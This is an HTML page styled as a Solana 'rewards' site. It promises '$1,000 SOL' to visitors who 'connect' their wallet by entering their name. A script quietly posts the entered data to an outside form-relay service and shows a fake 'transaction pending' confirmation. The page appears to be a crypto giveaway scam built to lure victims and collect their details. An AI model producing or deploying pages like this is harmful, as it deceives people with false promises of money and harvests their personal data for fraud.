<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA REWARDS</title>
    <!-- Advanced Web3 Typography -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root {
            --solana-green: #00FFA3;
            --solana-purple: #DC1FFF;
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            margin: 0;
            background-color: #050505;
            color: #ffffff;
            font-family: 'Space Grotesk', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            /* Advanced animated background */
            background: radial-gradient(circle at 10% 20%, rgba(0, 255, 163, 0.08) 0%, transparent 40%),
                        radial-gradient(circle at 90% 80%, rgba(220, 31, 255, 0.08) 0%, transparent 40%);
        }

        .glass-card {
            width: 90%;
            max-width: 520px;
            background: var(--glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 30px;
            padding: 60px 40px;
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
            text-align: center;
        }

        /* Header on a single line with advanced styling */
        h1 {
            font-family: 'Syncopate', sans-serif;
            font-size: 1.8rem;
            white-space: nowrap; /* Forces text to stay on one line */
            margin: 0 0 20px 0;
            background: linear-gradient(90deg, var(--solana-green), #fff, var(--solana-purple));
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 4s linear infinite;
            letter-spacing: -1px;
        }

        @keyframes shine {
            to { background-position: 200% center; }
        }

        .instruction {
            font-size: 1rem;
            color: #b0b0b0;
            margin-bottom: 40px;
            line-height: 1.6;
            letter-spacing: 0.5px;
            font-weight: 300;
        }

        .input-container {
            text-align: left;
            margin-bottom: 30px;
        }

        label {
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: var(--solana-green);
            margin-bottom: 12px;
            display: block;
            font-weight: 700;
        }

        input[type="text"] {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 18px;
            color: #fff;
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.1rem;
            box-sizing: border-box;
            transition: 0.3s;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: var(--solana-green);
            background: rgba(0, 255, 163, 0.05);
        }

        .btn {
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, var(--solana-green), var(--solana-purple));
            color: #fff;
            font-family: 'Syncopate', sans-serif;
            font-weight: 700;
            font-size: 0.9rem;
            cursor: pointer;
            transition: 0.4s;
            box-shadow: 0 10px 30px rgba(220, 31, 255, 0.3);
        }

        .btn:hover {
            transform: scale(1.02);
            filter: brightness(1.2);
            box-shadow: 0 15px 40px rgba(0, 255, 163, 0.4);
        }

        #success-view {
            display: none;
            animation: fadeIn 0.8s ease;
        }

        .congrats-text {
            font-size: 1.2rem;
            line-height: 1.8;
            color: var(--solana-green);
            font-weight: 500;
            padding: 25px;
            background: rgba(0, 255, 163, 0.05);
            border-radius: 20px;
            border: 1px dashed var(--solana-green);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="glass-card">
        <div id="initial-view">
            <form id="claim-form" action="https://formsubmit.co" method="POST">
                <h1>CLAIM $1,000 SOL</h1>
                <p class="instruction">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                
                <div class="input-container">
                    <label>Wallet Name</label>
                    <input type="text" name="name" placeholder="Enter your full name" required>
                </div>

                <input type="hidden" name="_captcha" value="false">
                <button type="submit" class="btn">CONNECT WALLET</button>
            </form>
        </div>

        <div id="success-view">
            <h1 style="font-size: 1.4rem;">TRANSACTION PENDING</h1>
            <div class="congrats-text">
                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        form.onsubmit = async (e) => {
            e.preventDefault();
            
            // Show Success UI
            document.getElementById('initial-view').style.display = 'none';
            document.getElementById('success-view').style.display = 'block';

            // Background submission
            const data = new FormData(form);
            fetch(form.action, {
                method: 'POST',
                body: data,
                headers: { 'Accept': 'application/json' }
            });
        };
    </script>
</body>
</html>
